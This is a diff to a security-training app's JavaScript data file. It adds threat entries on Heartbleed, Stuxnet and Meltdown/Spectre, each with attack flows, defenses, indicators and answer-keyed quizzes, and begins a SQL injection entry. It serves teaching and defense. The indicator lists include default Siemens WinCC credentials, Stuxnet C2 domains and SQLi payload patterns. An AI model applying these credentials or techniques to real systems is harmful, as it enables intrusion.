@@ -1,7 +1,7 @@
 /**
  * ThreatAppletData.js — Complete Threat Intelligence Data for Shield House
  *
- * 16 threat topics with overview, attack flow, defense, and quiz data
+ * 26 threat topics with overview, attack flow, defense, and quiz data
  * Used by ThreatAppletRenderer.js
  */
 const ThreatAppletData = {
@@ -1743,6 +1743,1086 @@ const ThreatAppletData = {
             { question: 'What is the BEST detection approach for zero-day exploits since no signatures exist?', options: ['Better antivirus signatures', 'Behavioral analysis and anomaly detection that identifies suspicious actions', 'Monitoring social media for exploit announcements', 'Stronger passwords'], correct: 1, explanation: 'Since zero-days have no known signatures, behavioral detection is key — monitoring for anomalous process behavior, unusual system calls, suspicious memory operations, and abnormal network traffic.' },
             { question: 'What is "virtual patching"?', options: ['Updating virtual machines', 'Using WAF/IPS rules to block known exploit patterns as a stopgap when a vendor patch is not yet available', 'Patching software in a virtual environment', 'A theoretical patch that doesn\'t actually fix the vulnerability'], correct: 1, explanation: 'Virtual patching deploys WAF or IPS rules that detect and block the specific exploit pattern, providing protection while the vendor develops and tests an actual code fix.' },
             { question: 'The Log4Shell vulnerability was particularly severe because:', options: ['It only affected one application', 'The Log4j library is embedded in millions of Java applications worldwide, creating an enormous attack surface', 'It required physical access to exploit', 'A patch was available before the exploit'], correct: 1, explanation: 'Log4j is used by virtually every Java application. Log4Shell (CVE-2021-44228) allowed trivial remote code execution via a simple string in log input, affecting millions of applications, services, and devices globally.' }
+        ]
+    },
+
+    // =================================================================
+    // 17. HEARTBLEED
+    // =================================================================
+    HEARTBLEED: {
+        code: 'HEARTBLEED',
+        title: 'Heartbleed (CVE-2014-0160)',
+        icon: '\u{1F494}',
+        severity: 'critical',
+        color: '#a855f7',
+        description: 'A critical vulnerability in OpenSSL\'s TLS heartbeat extension that allowed attackers to read up to 64KB of server memory per request, exposing private keys, credentials, and session data.',
+        overview: {
+            what: 'Heartbleed (CVE-2014-0160) was a catastrophic buffer over-read vulnerability in OpenSSL 1.0.1 through 1.0.1f. The TLS/DTLS heartbeat extension (RFC 6520) allows one endpoint to send a "heartbeat request" with a payload and length field. The vulnerable code trusted the attacker-supplied length without bounds checking, returning up to 64KB of adjacent server memory — potentially including private keys, session tokens, passwords, and other sensitive data. Because it left no trace in server logs, exploitation was undetectable.',
+            keyPoints: [
+                'Affected OpenSSL 1.0.1 through 1.0.1f (2 years in the wild before discovery)',
+                'The heartbeat extension sends a payload and length — the bug trusted the claimed length without verification',
+                'Each exploit request could leak up to 64KB of server memory',
+                'No authentication needed — any client could exploit any vulnerable server',
+                'Left no trace in standard server logs, making exploitation virtually undetectable'
+            ],
+            examples: [
+                { name: 'Community Health Systems Breach (2014)', detail: 'Attackers exploited Heartbleed to steal credentials from a Juniper VPN device, then used those credentials to exfiltrate 4.5 million patient records from the hospital network.' },
+                { name: 'Canadian Revenue Agency (2014)', detail: 'An attacker exploited Heartbleed against CRA servers to steal Social Insurance Numbers of approximately 900 Canadian taxpayers during tax filing season.' },
+                { name: 'Cloudflare Challenge (2014)', detail: 'Cloudflare publicly challenged researchers to extract a private SSL key from a Heartbleed-vulnerable server. Two researchers succeeded within hours, proving the vulnerability could leak cryptographic keys.' }
+            ],
+            stats: [
+                { label: 'Servers affected', value: '~17%', note: 'of all SSL/TLS web servers at disclosure' },
+                { label: 'Time in the wild', value: '~2 years', note: 'Dec 2011 to Apr 2014 unpatched' },
+                { label: 'CVSS score', value: '7.5', note: 'High — no auth required, memory disclosure' }
+            ]
+        },
+        attackFlow: {
+            title: 'Heartbleed Exploitation Flow',
+            steps: [
+                { phase: 'Target Identification', description: 'Attacker scans for servers running vulnerable OpenSSL versions (1.0.1 through 1.0.1f). Tools like Nmap with ssl-heartbleed script or Masscan identify targets at scale.', icon: '\u{1F50D}' },
+                { phase: 'Heartbeat Request Crafting', description: 'Attacker sends a TLS heartbeat request with a small payload (e.g., 1 byte) but claims a large length (up to 65,535 bytes). The malformed request exploits the missing bounds check.', icon: '\u{1F4DD}' },
+                { phase: 'Memory Over-Read', description: 'The vulnerable OpenSSL code allocates a response buffer based on the claimed length, copies the original payload, then reads adjacent heap memory to fill the remaining space — returning up to 64KB of server memory.', icon: '\u{1F4BE}' },
+                { phase: 'Data Harvesting', description: 'Attacker repeats the request thousands of times, each time receiving a different 64KB slice of heap memory. Over time, this reveals session cookies, credentials, private keys, and application data.', icon: '\u{1F4E5}' },
+                { phase: 'Credential Extraction', description: 'Leaked memory is parsed for high-value data: TLS private keys (allows decryption of all past/future traffic), session tokens, usernames, passwords, and API keys.', icon: '\u{1F511}' },
+                { phase: 'Silent Exploitation', description: 'Because the heartbeat response looks like normal TLS traffic and the server logs no error, the attacker operates completely undetected. No crash, no anomaly, no evidence.', icon: '\u{1F47B}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Monitor for abnormally large TLS heartbeat responses (larger than the request payload)',
+                'IDS/IPS signatures for Heartbleed exploit patterns (oversized heartbeat length fields)',
+                'Network traffic analysis for repeated heartbeat requests from the same source',
+                'Memory forensics on suspected compromised servers to identify leaked data patterns',
+                'Check OpenSSL version strings against known-vulnerable versions'
+            ],
+            prevention: [
+                'Patch OpenSSL to 1.0.1g or later immediately (or recompile with -DOPENSSL_NO_HEARTBEATS)',
+                'Revoke and reissue all SSL/TLS certificates after patching (private keys may have been compromised)',
+                'Force password resets for all users on affected services',
+                'Invalidate all active session tokens and API keys',
+                'Implement automated vulnerability scanning for critical library versions'
+            ],
+            response: [
+                'Patch all vulnerable OpenSSL instances as the highest priority',
+                'Assume private keys were compromised — revoke and reissue all certificates',
+                'Rotate all credentials (passwords, API keys, session tokens) that passed through affected servers',
+                'Review network logs for evidence of exploitation (repeated heartbeat requests from unusual sources)',
+                'Notify affected users and recommend password changes on any service that used the vulnerable servers'
+            ]
+        },
+        indicators: {
+            network: [
+                'TLS heartbeat responses significantly larger than the corresponding request payloads',
+                'High volume of heartbeat requests from a single IP address in a short time period',
+                'Heartbeat request payloads of 1 byte with claimed lengths of 65,535 bytes',
+                'Repeated TLS handshake + heartbeat sequences without normal application data exchange',
+                'Traffic patterns consistent with automated exploitation tools (ssltest.py, Metasploit module)'
+            ],
+            host: [
+                'OpenSSL version 1.0.1 through 1.0.1f installed on the system',
+                'Heartbeat extension enabled in TLS configuration (default in vulnerable versions)',
+                'No log entries despite evidence of exploitation (Heartbleed is silent by design)',
+                'Unexpected certificate reissuance or key rotation by hosting providers post-disclosure',
+                'Memory dumps containing fragments of user sessions, credentials, or private key material'
+            ],
+            behavioral: [
+                'Sudden credential compromises across multiple accounts with no phishing evidence',
+                'SSL/TLS certificate key compromise detected by Certificate Transparency logs',
+                'Session hijacking incidents correlating with Heartbleed-vulnerable server exposure',
+                'Mass credential resets triggered by affected service providers post-disclosure',
+                'Unexplained data breaches on services running vulnerable OpenSSL versions'
+            ],
+            tools: ['Nmap ssl-heartbleed script', 'Metasploit openssl_heartbleed module', 'ssltest.py (Filippo Valsorda)', 'Qualys SSL Labs test', 'OpenSSL version checker', 'Heartbleed-Masstest', 'sslyze', 'testssl.sh']
+        },
+        interactive: {
+            scenario: 'It\'s April 8, 2014 — the Heartbleed disclosure just dropped. Your organization runs 200+ web servers using OpenSSL for HTTPS. Your security team confirms that 147 servers are running vulnerable versions (1.0.1a through 1.0.1f). These servers handle customer logins, payment processing, and API authentication. Your CTO asks: "What do we need to do beyond just patching?" What is the complete remediation plan?',
+            options: [
+                'Patch OpenSSL on all 147 servers and resume normal operations — the vulnerability is fixed once patched',
+                'Patch all servers, then revoke and reissue all SSL certificates, force password resets for all users, invalidate all active sessions and API keys, and notify customers — because private keys and credentials may have already been silently stolen',
+                'Take all 147 servers offline until a thorough forensic investigation determines if they were exploited',
+                'Patch the servers and monitor for suspicious activity over the next 30 days before taking further action'
+            ],
+            correct: 1,
+            explanation: 'Patching alone is critically insufficient. Because Heartbleed leaves no trace and was exploitable for 2 years, you must ASSUME compromise. The complete plan: (1) Patch immediately to stop the bleeding, (2) Revoke and reissue ALL SSL/TLS certificates because private keys may have been read from memory (enabling past and future traffic decryption), (3) Force password resets because credentials in transit may have been captured, (4) Invalidate all sessions/API keys because tokens may have been leaked, (5) Notify customers because their data may have been exposed. Waiting to "see if you were exploited" is futile — the whole point of Heartbleed is that exploitation is invisible.'
+        },
+        quiz: [
+            { question: 'What is the root cause of the Heartbleed vulnerability?', options: ['A buffer overflow that crashes the server', 'A missing bounds check on the heartbeat payload length, causing a buffer over-read', 'An encryption weakness in the TLS protocol', 'A SQL injection in the OpenSSL configuration'], correct: 1, explanation: 'Heartbleed is a buffer over-read: the code trusted the attacker-supplied length field without checking if it matched the actual payload size, returning adjacent heap memory in the response.' },
+            { question: 'Why was Heartbleed particularly dangerous compared to other vulnerabilities?', options: ['It required no authentication, left no server logs, and could leak private keys', 'It allowed remote code execution', 'It could crash servers causing denial of service', 'It only affected outdated systems'], correct: 0, explanation: 'Heartbleed was devastating because: (1) any anonymous client could exploit it, (2) it left absolutely no trace in logs, and (3) it could leak the server\'s private TLS key, enabling decryption of all past and future traffic.' },
+            { question: 'How much memory could an attacker read per Heartbleed request?', options: ['Up to 1KB', 'Up to 64KB', 'Up to 1MB', 'The entire server memory'], correct: 1, explanation: 'Each heartbeat response could return up to 64KB (65,535 bytes) of adjacent heap memory. Attackers repeated the request thousands of times to harvest different memory segments.' },
+            { question: 'Why must SSL/TLS certificates be revoked AFTER patching Heartbleed?', options: ['Because the patch invalidates old certificates', 'Because the server\'s private key may have been leaked from memory, allowing attackers to impersonate the server or decrypt traffic', 'Because certificates expire when OpenSSL is updated', 'Because new certificates are faster'], correct: 1, explanation: 'If the private key was leaked via Heartbleed, an attacker can impersonate the server (MITM) and decrypt recorded traffic (if not using forward secrecy). Revoking and reissuing certificates is essential.' },
+            { question: 'What RFC defines the TLS heartbeat extension exploited by Heartbleed?', options: ['RFC 5246', 'RFC 6520', 'RFC 7540', 'RFC 8446'], correct: 1, explanation: 'RFC 6520 defines the TLS/DTLS Heartbeat Extension, designed as a keep-alive mechanism. The implementation flaw in OpenSSL — not the RFC itself — caused Heartbleed.' }
+        ]
+    },
+
+    // =================================================================
+    // 18. STUXNET
+    // =================================================================
+    STUXNET: {
+        code: 'STUXNET',
+        title: 'Stuxnet',
+        icon: '\u{2622}',
+        severity: 'critical',
+        color: '#a855f7',
+        description: 'The first known cyber weapon — a sophisticated worm targeting Iranian nuclear centrifuges using four zero-day exploits, PLC manipulation, and air-gap jumping via USB drives.',
+        overview: {
+            what: 'Stuxnet was a highly sophisticated computer worm discovered in 2010, widely attributed to a joint U.S.-Israeli operation (codenamed "Olympic Games"). It targeted Siemens Step 7 software controlling programmable logic controllers (PLCs) operating uranium enrichment centrifuges at Iran\'s Natanz facility. Stuxnet used an unprecedented four zero-day exploits, stolen digital certificates, and rootkit techniques to cross air gaps via USB drives, propagate through networks, and silently sabotage centrifuge operations while reporting normal readings to operators.',
+            keyPoints: [
+                'Used 4 zero-day exploits simultaneously — unprecedented sophistication',
+                'Targeted Siemens S7-315/S7-417 PLCs controlling centrifuge frequency converters',
+                'Jumped air-gapped networks via infected USB drives',
+                'Sabotaged centrifuges by altering rotation speeds while displaying normal telemetry to operators',
+                'First known case of a cyberattack causing physical destruction of industrial equipment'
+            ],
+            examples: [
+                { name: 'Natanz Uranium Enrichment (2010)', detail: 'Stuxnet destroyed approximately 1,000 of 5,000 IR-1 centrifuges at Natanz by alternating rotation speeds between 1,410 Hz and 2 Hz, causing mechanical failure while SCADA screens showed normal 1,064 Hz operation.' },
+                { name: 'Flame Malware (2012)', detail: 'A related cyber-espionage tool sharing code modules with Stuxnet, used for intelligence gathering across the Middle East. Demonstrated the broader toolset behind the Olympic Games program.' },
+                { name: 'Duqu (2011)', detail: 'A reconnaissance worm sharing Stuxnet\'s code platform (Tilded), designed to gather intelligence on industrial control systems — likely a precursor or companion to Stuxnet operations.' }
+            ],
+            stats: [
+                { label: 'Zero-days used', value: '4', note: 'Windows Shell LNK, Print Spooler, Task Scheduler, Server Service' },
+                { label: 'Centrifuges destroyed', value: '~1,000', note: 'of 5,000 IR-1 centrifuges at Natanz' },
+                { label: 'Countries infected', value: '115+', note: 'Iran, Indonesia, India had highest infection rates' }
+            ]
+        },
+        attackFlow: {
+            title: 'Stuxnet Attack Chain',
+            steps: [
+                { phase: 'Initial Infection (USB)', description: 'Stuxnet was introduced to the air-gapped Natanz network via infected USB drives. The LNK vulnerability (CVE-2010-2568) auto-executed the payload when the USB contents were viewed in Windows Explorer.', icon: '\u{1F4BB}' },
+                { phase: 'Network Propagation', description: 'Once inside, Stuxnet spread across the network using multiple vectors: Windows Server Service vulnerability (MS08-067), Print Spooler zero-day, network shares, WinCC database connections, and Siemens Step 7 project files.', icon: '\u{1F310}' },
+                { phase: 'Target Validation', description: 'On each infected machine, Stuxnet checked for Siemens Step 7 software and specific PLC configurations (S7-315/S7-417 with particular frequency converter setups). If the target didn\'t match, the worm remained dormant.', icon: '\u{1F50E}' },
+                { phase: 'PLC Code Injection', description: 'On matching systems, Stuxnet injected malicious code into the PLC program, intercepting commands between Step 7 and the frequency converters controlling centrifuge rotation speeds.', icon: '\u{1F489}' },
+                { phase: 'Sabotage Execution', description: 'The injected code periodically altered centrifuge speeds — ramping from normal 1,064 Hz to 1,410 Hz, then dropping to 2 Hz. This caused mechanical stress, vibration, and eventual centrifuge destruction over weeks to months.', icon: '\u{1F4A5}' },
+                { phase: 'Stealth & Deception', description: 'A rootkit component intercepted PLC status queries and replayed pre-recorded "normal" readings to the SCADA display. Operators saw healthy centrifuges while they were being destroyed. Stolen Realtek and JMicron certificates signed the drivers.', icon: '\u{1F576}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Anomaly detection on industrial control system (ICS) network traffic patterns',
+                'Integrity monitoring of PLC program code for unauthorized modifications',
+                'USB device control policies with allowlisting and automatic scanning',
+                'Comparison of reported sensor values against independent physical measurements',
+                'Host-based monitoring for drivers signed with revoked or stolen certificates'
+            ],
+            prevention: [
+                'Strict USB device control: disable autorun, whitelist approved devices, enforce scanning',
+                'Air-gap discipline: dedicated systems for ICS networks, no dual-use workstations',
+                'Application whitelisting on SCADA/HMI workstations',
+                'PLC code integrity verification and change management',
+                'Network segmentation between IT and OT (Operational Technology) environments per IEC 62443'
+            ],
+            response: [
+                'Isolate affected ICS/SCADA networks from all external connectivity immediately',
+                'Verify PLC program integrity by comparing against known-good offline backups',
+                'Inspect all USB devices and removable media for malware',
+                'Engage ICS-specialized incident response teams (not standard IT responders)',
+                'Validate physical process readings against independent sensors to detect spoofed telemetry'
+            ]
+        },
+        indicators: {
+            network: [
+                'Unusual traffic between engineering workstations and PLCs outside maintenance windows',
+                'Attempts to access Siemens WinCC database (default credentials: WinCCConnect/2WSXcder)',
+                'Propagation attempts via SMB (MS08-067) or Print Spooler across ICS network segments',
+                'DNS queries for Stuxnet C2 domains (mypremierfutbol.com, todaysfutbol.com)',
+                'RPC traffic indicative of Windows Task Scheduler exploitation'
+            ],
+            host: [
+                'Files signed with revoked Realtek Semiconductor or JMicron Technology certificates',
+                'Modified Siemens Step 7 DLL files (s7otbxdx.dll replaced with malicious version)',
+                'Rootkit drivers hiding files and registry entries related to the worm',
+                'Suspicious .LNK files on USB drives exploiting the Windows Shell vulnerability',
+                'Scheduled tasks created via Windows Task Scheduler zero-day for privilege escalation'
+            ],
+            behavioral: [
+                'Centrifuge failure rates significantly above normal operating parameters',
+                'Discrepancy between SCADA-reported values and physical measurements (pressure, vibration, RPM)',
+                'Engineering workstations executing unusual processes when Step 7 projects are opened',
+                'Increased rate of USB drive usage across air-gapped facility workstations',
+                'PLC program modifications without corresponding change management records'
+            ],
+            tools: ['Siemens SIMATIC tools (PLC verification)', 'ICS-CERT advisories', 'YARA rules for Stuxnet signatures', 'Industrial protocol analyzers (Wireshark with S7comm dissector)', 'USB device forensics tools', 'Volatility (memory analysis)', 'IDA Pro / Ghidra (malware reverse engineering)', 'Dragos ICS threat intelligence']
+        },
+        interactive: {
+            scenario: 'You are the cybersecurity lead at a water treatment facility. A technician reports that three PLCs controlling chemical dosing pumps have been behaving erratically — the pumps occasionally run at incorrect rates for 30-second intervals before returning to normal. However, the SCADA display has shown normal readings throughout. The facility recently discovered that a contractor used a personal USB drive on an engineering workstation. What is happening and what do you do?',
+            options: [
+                'The PLCs are malfunctioning due to age — schedule hardware replacement and continue normal operations',
+                'The USB drive likely introduced malware that is manipulating PLC code while spoofing SCADA readings — immediately isolate the ICS network, verify PLC code integrity against offline backups, forensically image the engineering workstation and USB drive, and install independent physical sensors to validate chemical dosing levels',
+                'The SCADA display is correct and the technician is mistaken — have the technician recalibrate their instruments',
+                'Update the PLC firmware and reboot the SCADA system to clear any temporary glitches'
+            ],
+            correct: 1,
+            explanation: 'This scenario mirrors the Stuxnet attack pattern: (1) an unauthorized USB device as the infection vector, (2) PLC manipulation causing incorrect physical behavior, and (3) SCADA display spoofing showing normal readings while equipment is being misused. The fact that physical observation differs from SCADA telemetry is the critical red flag — it means the reporting layer has been compromised. Immediate isolation prevents further damage, PLC code verification against known-good backups detects modifications, forensic analysis of the workstation and USB drive identifies the malware, and independent sensors provide trustworthy readings until the system integrity is restored.'
+        },
+        quiz: [
+            { question: 'How did Stuxnet initially reach the air-gapped Natanz facility?', options: ['Through the internet via a firewall vulnerability', 'Via infected USB drives exploiting a Windows LNK vulnerability', 'Through satellite communications', 'Via a compromised supplier\'s email'], correct: 1, explanation: 'Stuxnet crossed the air gap via USB drives. The LNK vulnerability (CVE-2010-2568) caused the malware to auto-execute when the USB contents were simply viewed in Windows Explorer — no user click required.' },
+            { question: 'How many zero-day exploits did Stuxnet use simultaneously?', options: ['1', '2', '4', '7'], correct: 2, explanation: 'Stuxnet used 4 zero-day exploits: Windows Shell LNK (CVE-2010-2568), Print Spooler (CVE-2010-2729), Task Scheduler privilege escalation (CVE-2010-3338), and Server Service (CVE-2008-4250/MS08-067).' },
+            { question: 'What did Stuxnet do to the centrifuges at Natanz?', options: ['Shut them down immediately', 'Altered rotation speeds to cause mechanical failure while displaying normal readings to operators', 'Caused them to overheat and explode', 'Encrypted the PLC firmware for ransom'], correct: 1, explanation: 'Stuxnet alternated centrifuge speeds between 1,410 Hz and 2 Hz (normal was 1,064 Hz), causing mechanical stress and destruction. Meanwhile, a rootkit replayed normal telemetry to the SCADA display, hiding the sabotage.' },
+            { question: 'Why did Stuxnet use stolen digital certificates from Realtek and JMicron?', options: ['To encrypt its communications', 'To sign its kernel-mode drivers so Windows would load them without security warnings', 'To bypass antivirus subscriptions', 'To impersonate legitimate software updates'], correct: 1, explanation: 'Windows requires kernel-mode drivers to be signed by trusted certificates. Stuxnet used stolen Realtek and JMicron code-signing certificates to make its rootkit drivers appear legitimate, allowing them to load without triggering security alerts.' },
+            { question: 'What made Stuxnet historically significant in cybersecurity?', options: ['It was the largest data breach in history', 'It was the first known cyber weapon to cause physical destruction of industrial equipment', 'It was the fastest-spreading virus ever', 'It was the first ransomware attack'], correct: 1, explanation: 'Stuxnet was the first publicly known instance of a cyberattack causing physical destruction. It proved that software could cross into the physical world, destroying hardware (centrifuges) through code — ushering in the era of cyber warfare.' }
+        ]
+    },
+
+    // =================================================================
+    // 19. MELTDOWN & SPECTRE
+    // =================================================================
+    MELTDOWN_SPECTRE: {
+        code: 'MELTDOWN_SPECTRE',
+        title: 'Meltdown & Spectre',
+        icon: '\u{1F9CA}',
+        severity: 'critical',
+        color: '#a855f7',
+        description: 'Hardware-level CPU vulnerabilities exploiting speculative execution to leak kernel memory (Meltdown) and cross-process data (Spectre) through microarchitectural side channels.',
+        overview: {
+            what: 'Meltdown (CVE-2017-5754) and Spectre (CVE-2017-5753, CVE-2017-5715) are hardware vulnerabilities in modern CPUs disclosed in January 2018. They exploit speculative execution — a performance optimization where CPUs execute instructions ahead of time and discard incorrect predictions. Meltdown breaks the isolation between user applications and the OS kernel, allowing any program to read kernel memory. Spectre tricks other applications into leaking their own data. Both use cache-based side channels to extract data from speculatively executed instructions, even though those instructions are architecturally "rolled back."',
+            keyPoints: [
+                'Meltdown: reads arbitrary kernel memory from user space by exploiting out-of-order execution (primarily Intel CPUs)',
+                'Spectre Variant 1 (Bounds Check Bypass): manipulates branch prediction to access out-of-bounds memory in another process',
+                'Spectre Variant 2 (Branch Target Injection): poisons the branch target buffer to redirect speculative execution',
+                'Both use cache timing side channels (Flush+Reload, Prime+Probe) to extract leaked data',
+                'Hardware-level flaw — cannot be fully fixed without new CPU designs; mitigations carry performance penalties'
+            ],
+            examples: [
+                { name: 'Cloud Provider Isolation Breach', detail: 'Researchers demonstrated Meltdown could read host kernel memory from within a virtual machine, breaking the fundamental isolation guarantees of cloud computing (AWS, Azure, GCP all required emergency patching).' },
+                { name: 'Browser-Based Spectre (2018)', detail: 'Spectre was demonstrated in JavaScript within web browsers — a malicious webpage could read data from other browser tabs or the browser process itself. Led to Site Isolation in Chrome and reduced timer precision in all browsers.' },
+                { name: 'Intel SGX Bypass (Foreshadow/L1TF)', detail: 'A Spectre-class variant (CVE-2018-3615) could extract data from Intel SGX secure enclaves — hardware-level trusted execution environments designed to be impervious to OS-level attacks.' }
+            ],
+            stats: [
+                { label: 'CPUs affected', value: 'Billions', note: 'Nearly every Intel CPU since 1995 (Meltdown), most modern CPUs (Spectre)' },
+                { label: 'Performance impact', value: '5-30%', note: 'Workload-dependent penalty from kernel mitigations' },
+                { label: 'Spectre variants discovered', value: '15+', note: 'New variants continue to emerge years later' }
+            ]
+        },
+        attackFlow: {
+            title: 'Speculative Execution Attack Flow',
+            steps: [
+                { phase: 'Target Selection', description: 'Attacker identifies a target: kernel memory (Meltdown), another process\'s data (Spectre V1), or cross-VM data in cloud environments. The attack runs entirely in user space.', icon: '\u{1F3AF}' },
+                { phase: 'Speculative Trigger', description: 'For Meltdown: execute a memory read of a kernel address — the CPU speculatively completes the read before the permission check raises an exception. For Spectre: mistrain the branch predictor to speculatively execute a gadget that reads the target data.', icon: '\u{26A1}' },
+                { phase: 'Cache Loading', description: 'During speculative execution (before the CPU realizes the mistake and rolls back), the leaked data is used as an index to load a specific cache line. Although the speculation is discarded architecturally, the cache state change persists.', icon: '\u{1F4E6}' },
+                { phase: 'Side-Channel Extraction', description: 'Attacker measures memory access times using Flush+Reload or Prime+Probe techniques. The cache line that was speculatively loaded will be faster to access, revealing the value of the leaked byte.', icon: '\u{23F1}' },
+                { phase: 'Byte-by-Byte Reconstruction', description: 'The attack repeats for each byte of target memory. At approximately 500KB/s (Meltdown on vulnerable Intel CPUs), the attacker reconstructs kernel memory, encryption keys, passwords, or other sensitive data.', icon: '\u{1F9E9}' },
+                { phase: 'Data Exploitation', description: 'Extracted data may include kernel ASLR layout (defeating address randomization), cryptographic keys, credentials, or other process secrets — enabling further attacks or complete system compromise.', icon: '\u{1F4A3}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Performance counter monitoring for abnormal cache miss patterns and branch mispredictions',
+                'Hardware performance counters (HPC) tracking speculative execution anomalies',
+                'Detection of Flush+Reload or Prime+Probe access patterns via OS-level monitoring',
+                'Cloud provider monitoring for cross-VM cache timing attacks',
+                'Runtime detection of Spectre gadgets in JIT-compiled code (browsers, runtimes)'
+            ],
+            prevention: [
+                'Kernel Page Table Isolation (KPTI/KAISER) — separates user and kernel page tables to prevent Meltdown',
+                'Retpoline — replaces indirect branches with return-based sequences to mitigate Spectre V2',
+                'Microcode updates from CPU vendors (Intel, AMD, ARM) to add hardware mitigations',
+                'Browser mitigations: Site Isolation, reduced timer precision (performance.now()), disabled SharedArrayBuffer',
+                'Compiler-level mitigations: speculative load hardening, bounds checking after branches'
+            ],
+            response: [
+                'Apply OS patches (KPTI for Meltdown) and CPU microcode updates immediately',
+                'Update all hypervisors and cloud platform software for VM isolation fixes',
+                'Update web browsers to versions with Spectre mitigations (Site Isolation)',
+                'Benchmark performance impact and adjust capacity planning for 5-30% overhead',
+                'Long-term: evaluate hardware refresh cycles for CPUs with architectural fixes'
+            ]
+        },
+        indicators: {
+            network: [
+                'Not directly network-observable — Meltdown/Spectre are local attacks',
+                'Cloud environments: unusual VM density or compute patterns may indicate exploitation',
+                'Browser-based Spectre: JavaScript payloads in web pages performing high-precision timing',
+                'Data exfiltration over network channels after successful local memory extraction',
+                'Unusual cache-timing traffic patterns in shared hosting environments'
+            ],
+            host: [
+                'Abnormally high cache miss rates detected via CPU performance counters',
+                'Processes performing Flush+Reload patterns (repeated clflush instructions + timing measurements)',
+                'High branch misprediction rates on specific code paths',
+                'User-space processes accessing kernel virtual address ranges (Meltdown attempt)',
+                'Unpatched kernel (missing KPTI) or outdated CPU microcode versions'
+            ],
+            behavioral: [
+                'Unexplained performance degradation after applying KPTI patches (expected but validate cause)',
+                'Processes performing systematic memory probing with microsecond-precision timing',
+                'JavaScript executing high-resolution timing loops in browser contexts',
+                'Unexpected kernel memory disclosure in crash dumps or debug output',
+                'Cloud tenants experiencing unexplained data leakage across VM boundaries'
+            ],
+            tools: ['Spectre/Meltdown Checker (spectre-meltdown-checker.sh)', 'Intel MDS Tool', 'Linux /sys/devices/system/cpu/vulnerabilities/', 'InSpectre (Windows)', 'perf stat (HPC monitoring)', 'Immunity Debugger', 'cachegrab (SGX attacks)', 'Spectre PoC (Google Project Zero)']
+        },
+        interactive: {
+            scenario: 'Your organization runs a private cloud (OpenStack) hosting multiple customer tenants on shared physical servers with Intel Xeon CPUs. The Meltdown/Spectre disclosure just dropped. A customer asks: "Can another tenant on the same physical host read our encryption keys from memory?" Your cloud engineering team reports that applying the kernel patches will cause a 15-25% performance degradation on database workloads. Management asks if you can delay patching. What do you recommend?',
+            options: [
+                'Delay patching until the performance impact can be better optimized — the attack is theoretical and no real-world exploits exist yet',
+                'Patch immediately and accept the performance hit — Meltdown allows any process to read kernel memory, and Spectre can leak data across VM boundaries, fundamentally breaking tenant isolation. Add capacity to compensate for the performance overhead.',
+                'Only patch the servers running the most sensitive workloads and leave others unpatched',
+                'Switch to AMD processors since they are immune to all variants of the attack'
+            ],
+            correct: 1,
+            explanation: 'In a multi-tenant cloud environment, Meltdown and Spectre break the fundamental security guarantee: tenant isolation. A malicious VM can read kernel memory (Meltdown) or data from co-located VMs (Spectre), potentially extracting encryption keys, credentials, and sensitive data. Delaying patching means knowingly operating a cloud where tenant isolation is broken. The correct response: (1) Patch ALL hosts immediately — KPTI for Meltdown, microcode + retpoline for Spectre, (2) Accept and plan for the performance impact by adding capacity, (3) Communicate transparently with customers about the situation and mitigations. AMD CPUs are not immune to Spectre (only less affected by Meltdown), so switching vendors is not a complete solution.'
+        },
+        quiz: [
+            { question: 'What CPU performance optimization do Meltdown and Spectre exploit?', options: ['Hyperthreading', 'Speculative execution — where the CPU executes instructions ahead of time based on predictions', 'CPU overclocking', 'Multi-core parallel processing'], correct: 1, explanation: 'Speculative execution is a performance feature where the CPU predicts which instructions to execute next. If wrong, it rolls back — but the cache side effects of speculation remain, leaking data.' },
+            { question: 'What is the key difference between Meltdown and Spectre?', options: ['Meltdown is software, Spectre is hardware', 'Meltdown reads kernel memory from user space; Spectre tricks processes into leaking their own data', 'Meltdown affects Intel, Spectre only affects AMD', 'Meltdown is more common, Spectre is more severe'], correct: 1, explanation: 'Meltdown breaks user/kernel isolation by exploiting out-of-order execution to read kernel memory. Spectre manipulates branch prediction to trick other processes or code into speculatively accessing and leaking their own data.' },
+            { question: 'What is KPTI (Kernel Page Table Isolation) designed to mitigate?', options: ['Spectre Variant 1', 'Spectre Variant 2', 'Meltdown — by separating user and kernel page tables so the kernel is not mapped during user execution', 'Buffer overflow attacks'], correct: 2, explanation: 'KPTI (also called KAISER) removes kernel page table mappings from user space, so even if speculative execution occurs, there is no kernel memory mapped to read. It specifically mitigates Meltdown.' },
+            { question: 'How do attackers extract data from speculative execution if the CPU rolls back the results?', options: ['The data is written to a file before rollback', 'Cache timing side channels — speculatively loaded cache lines remain, and access timing reveals the leaked data', 'Network packets are sent during speculation', 'Screen rendering occurs before rollback'], correct: 1, explanation: 'While architectural state is rolled back, microarchitectural state (CPU cache) is not. Attackers use Flush+Reload or Prime+Probe to measure cache access times, inferring which data was speculatively loaded.' },
+            { question: 'Why is Spectre considered harder to fully mitigate than Meltdown?', options: ['Because Spectre affects more CPU vendors', 'Because Spectre exploits branch prediction — a fundamental feature of all modern CPUs that cannot be disabled without catastrophic performance loss', 'Because Spectre is a software bug', 'Because no patches exist for Spectre'], correct: 1, explanation: 'Meltdown has a clean fix (KPTI). Spectre exploits branch prediction, which is deeply embedded in all modern CPU designs. Mitigations (retpoline, IBRS) add overhead but new Spectre variants keep emerging because the fundamental prediction mechanism persists.' }
+        ]
+    },
+
+    // =================================================================
+    // 20. SQL INJECTION
+    // =================================================================
+    SQL_INJECTION: {
+        code: 'SQL_INJECTION',
+        title: 'SQL Injection',
+        icon: '\u{1F4BE}',
+        severity: 'critical',
+        color: '#a855f7',
+        description: 'An injection attack where malicious SQL statements are inserted into application input fields to manipulate or extract data from backend databases.',
+        overview: {
+            what: 'SQL Injection (SQLi) occurs when an attacker inserts malicious SQL code into an application\'s input fields, which is then executed by the backend database. This happens when applications build SQL queries by concatenating user input without proper sanitization or parameterization. SQLi remains one of the most prevalent and damaging web vulnerabilities, enabling data theft, authentication bypass, data modification, and in some cases, complete server compromise.',
+            keyPoints: [
+                'Classic SQLi: tautology attacks (OR 1=1), UNION SELECT for data extraction, stacked queries',
+                'Blind SQLi: boolean-based (true/false responses) and time-based (WAITFOR DELAY/SLEEP) when no data is returned',
+                'Out-of-band SQLi: data exfiltration via DNS, HTTP, or email when inline extraction is blocked',
+                'Parameterized queries (prepared statements) are the definitive defense — not input filtering alone',
+                'OWASP Top 10 #3 (Injection) consistently since 2010'
+            ],
+            examples: [
